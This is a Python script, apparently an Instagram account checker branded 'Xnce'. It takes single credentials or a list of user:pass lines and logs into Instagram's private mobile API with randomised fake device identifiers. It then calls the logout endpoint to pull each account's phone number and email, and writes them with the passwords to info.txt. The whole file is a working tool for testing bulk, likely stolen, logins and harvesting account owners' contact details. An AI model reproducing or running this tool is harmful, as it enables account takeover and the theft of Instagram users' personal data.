import os, uuid, string, time, calendar, random
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests
class Xnce():
    def __init__(self):
        print("""
██╗  ██╗███╗   ██╗ ██████╗███████╗
╚██╗██╔╝████╗  ██║██╔════╝██╔════╝
 ╚███╔╝ ██╔██╗ ██║██║     █████╗
 ██╔██╗ ██║╚██╗██║██║     ██╔══╝
██╔╝ ██╗██║ ╚████║╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
              Instagram: @xnce / @ro1c\n""")
        mode = input("[1] 1 account [2] list (user:pass): ")
        if mode=="1":
            self.username = input("[+] username: ")
            self.password = input("[+] password: ")
            self.login()
        elif mode=="2":
            try:
                self.accounts = list(open("accounts.txt","r").read().split("\n"))
            except:
                print("[-] accounts.txt is missing")
                input()
                exit()
            for userpass in self.accounts:
                if ':' in userpass:
                    self.username = userpass.split(':')[0]
                    self.password = userpass.split(':')[1]
                    self.login()
        else:
            exit()
        print("[+] Done + Saved In 'info.txt'")
        input()
        exit()
    def login(self):
        head = {"user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)"}
        data = {
            "jazoest": "22452",
            "phone_id": uuid.uuid4(),
            "enc_password": f"#PWD_INSTAGRAM:0:{calendar.timegm(time.gmtime())}:{self.password}",
            "username": self.username,
            "adid": uuid.uuid4(),
            "guid": uuid.uuid4(),
            "device_id": uuid.uuid4(),
            "google_tokens": "[]",
            "login_attempt_count": "0"}
        req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=head, data=data)
        if "logged_in_user" in req.text:
            self.sessionid = req.cookies.get("sessionid")
            self.info()
        else:
            print(f"[-] {self.username}:{self.password} {req.json()['message']}")
    def info(self):
        url = "https://i.instagram.com/api/v1/accounts/logout/"
        head = {
            "user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)",
            "cookie": f"sessionid={self.sessionid}"
            }
        data = {
            "phone_id": uuid.uuid4(),
            "guid": uuid.uuid4(),
            "device_id": uuid.uuid4(),
            "_uuid": uuid.uuid4(),
            "one_tap_app_login": "true"
            }
        req = requests.post(url, headers=head, data=data)
        #print(req.text)
        if "login_nonce" in req.text and '"status":"ok"' in req.text:
            phone_number = req.json()["phone_number"]
            email = req.json()["email"]
            print(f'[+] {self.username}:{self.password} "phone_number":"{phone_number}","email":"{email}"')
            open("info.txt","a").write(f'{self.username}:{self.password} "phone_number":"{phone_number}","email":"{email}"\n')
        else:
            print(f'[-] {self.username}:{self.password} {req.text}')
Xnce()
